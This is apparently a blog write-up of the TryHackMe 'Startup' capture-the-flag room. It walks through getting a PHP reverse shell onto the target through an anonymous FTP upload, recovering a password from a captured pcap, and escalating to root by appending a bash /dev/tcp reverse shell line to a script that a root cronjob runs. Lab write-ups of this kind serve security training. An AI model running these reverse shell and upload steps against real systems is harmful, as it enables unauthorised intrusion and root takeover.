---
layout: post
permalink: /posts/thm/startup
title: "Startup"
---

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck! <br/>

Scan the target machine with nmap.

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/startup/nmap.png)

From the scan result we can see there is open port 80 HTTP, 22 SSH and 21 FTP. We can also notice that anonnymous login is enabled on FTP. Let's login and see whether we will be able to find something there.

```
ftp <IP>
```

When it prompt for username provide `anonymous`

![ftp](/assets/images/thm/startup/ftp.png)

There are two files and one directory which is empty. You can download the files with the following command `get <FILLE_NAME>` <br/>

Let's read the text file.

![notice](/assets/images/thm/startup/notice.png)

Hmm... probably we'll be able to upload file into FTP which it'll be accessible through the website. I wasn't able to open the jpg file. Let's visit the website.

![website](/assets/images/thm/startup/website.png)

Nothing useful. Try to scan for hidden directories. I'm going to use gobuster for that purpose.

```
gobuster dir -u http://<IP>/ -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt 
```

![gobuster](/assets/images/thm/startup/gobuster.png)

We have found `files` directory. Let's visit it.

![files](/assets/images/thm/startup/files.png)

These are the files from FTP which we had visited. Let's try to upload reverse shell script. I'm going to use this one `https://github.com/pentestmonkey/php-reverse-shell` Don't forget to change the IP address with your attacking machine IP and desired port.

Go again to the FTP server and navigate to `ftp` folder. From there you can execute the following command `put <FILE_NAME>` to upload your reverse shell script.

![upload](/assets/images/thm/startup/upload.png)

Your script has been uploaded successfully. Go and visit `http://<IP>/files/ftp/` to see whether we'll find your script.

![script](/assets/images/thm/startup/script.png)

Nice, it's here. Start netcat listener on your machine with the port you set in the script.

```
nc -lvnp <PORT>
```

Once the listener is set try to reach the script. It will try loading and you should have shell access in your terminal.

![shell](/assets/images/thm/startup/shell.png)

Now try to find the secret spicy soup recipe.

If list the root directory `/` you will find an interesting folder `incidents`.

![incidents](/assets/images/thm/startup/incidents.png)

How we can download this file. I'm going to start a python server.

```
python -m SimpleHTTPServer
```

Now on your machine execute the following command to download the pcapng file.

```
wget http://<TARGET_MACHINE_IP>:8000/suspicious.pcapng
```

Now we are going to use Wireshark to open the file.

![wireshark](/assets/images/thm/startup/wireshark.png)

Looking trough the packets I find out that someone has also already hack Spice Hut. Right click on packet 35 and select Follow -> TCP Stream

![pass](/assets/images/thm/startup/pass.png)

Someone has tried to see whether user lennie has any sudo rights. I tried to ssh with this username and password but it wasn't successfull.

![ssh](/assets/images/thm/startup/ssh.png)

Then I decided to try to switch the user from the shell which we have but first we need to stabilize our shell.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

`CTRL+Z` to background the process and go back to the local host. Execute `stty raw -echo` and after that `fg + ENTER` to go back to the reverse shell.

![stabilize](/assets/images/thm/startup/stabilize.png)

Now we should be able to switch to lennie

```
su lennie
```

Try to find the user flag.

Now we need to find a way to escalate our priviliges. As awlays I tried to check whether lennie has any sudo right with `sudo -l` but lennie doesn't have any rights. What can we do then? There is a folder `scripts` in lennie home directory, let's visit it. There are two files.

![ls-la](/assets/images/thm/startup/ls-la.png)

planner.sh is owned by root and we are not able to write in it but we can read it.

![cat](/assets/images/thm/startup/cat.png)

The script can executes other scrpit print.sh

![print](/assets/images/thm/startup/print.png)

Probably planner.sh is runned by cronjob but let's check that. We are going to use `pspy64`. It's a tool which snoop on processes without need root permissions. <br>

start python server on your machine

```
python3 -m httpp.server
```

Download it on the target machine

```
wget http://<YOUR_IP>:8000/pspy64
```

![pspy64](/assets/images/thm/startup/pspy64.png)

![pspy-scan](/assets/images/thm/startup/pspy-scan.png)

As we thought planner.sh is run by cronjob as root 

So, we are the owner of print.sh. We can add some additional script in it. Here you can find some reverse shell cheat sheet `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` 

Change the script with your IP address

```
echo "bash -i >& /dev/tcp/<IP>/5555 0>&1" >> /etc/print.sh
```

We also need to start listener on our machine

```
nc -lvnp 5555
```

Wait a little bit and the script will be executed automatically via cronjob. 

![root](/assets/images/thm/startup/root.png)

Here we go, we have root access.
